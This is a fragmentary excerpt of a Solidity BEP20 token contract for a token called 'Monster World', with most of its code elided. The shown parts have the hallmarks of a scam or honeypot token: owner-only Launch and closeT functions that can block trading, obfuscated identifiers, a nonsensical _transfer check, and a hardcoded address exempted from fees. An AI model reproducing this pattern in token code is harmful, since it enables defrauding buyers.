...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address receiveAddress) 
    {
        ...
        isExcludedFromCut[receiveAddress] = true;
        ...
        isOnceEatExempt[receiveAddress] = true;
    ...
    function Launch(uint256 a) public onlyOwner {
        _killBlock = a;
        launchBlock = block.number;
    }
    
    function _transfer(address wdsawdawd, address rfwaecpien) internal view returns (bool){
        return (wdsawdawd != rfwaecpien) || (wdsawdawd != doYouLikeBase || false);
    }

    function closeT() public onlyOwner {
        launchBlock = 0;
    }
...
contract MW is BEP20 {
    constructor() BEP20(
        "Monster World", 
        "MW",
        200000000,
        [uint256(0),uint256(0),uint256(0)],
        [uint256(0),uint256(15),uint256(0)],
        [uint256(0),uint256(15),uint256(0)],
        [uint256(200000000),uint256(200000000)],
        [0x15D2325D2a8e005849543848dF9e8Fe05300a0df,0x15D2325D2a8e005849543848dF9e8Fe05300a0df],
        0x139db9B68D9D5F21721AA9efC80843B2a4315D02
    ){}
}